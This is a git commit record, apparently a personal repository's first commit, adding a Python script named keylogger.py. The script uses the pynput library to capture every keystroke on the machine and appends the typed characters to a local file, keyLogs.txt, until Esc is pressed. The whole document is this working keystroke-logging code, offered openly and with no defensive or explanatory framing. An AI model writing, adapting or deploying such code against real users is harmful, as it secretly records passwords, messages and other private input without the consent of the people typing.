556e50802f9d577badfb5f3de98e373bf3e1aaca
Aviksaikat <saikickkarma@gmail.com>
2020-08-30 21:06:13 +0530

    first commit

---
+++ keylogger/keylogger.py
@@ -0,0 +1,36 @@
+import pynput
+from pynput.keyboard import Key,Listener
+
+count =0
+keys = []
+
+def on_press(key):
+    global keys,count
+    #print(key,"pressed")
+    keys.append(key)
+    count+=1
+
+    if(count>=10):
+        count = 0
+        write_file(keys)
+        keys = []
+
+def on_release(key):
+    if(key == Key.esc):
+        return False
+
+def write_file(keys):
+    with open("keyLogs.txt","a+") as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            if(k.find("space")>0):
+                f.write("\n")
+            elif(k.find("Key") == -1):#if we find backspace ,ctl etc we will not store that
+                f.write(k)
+
+with Listener(on_press = on_press,on_release = on_release) as listenes:
+    listenes.join()
+
+
+
+
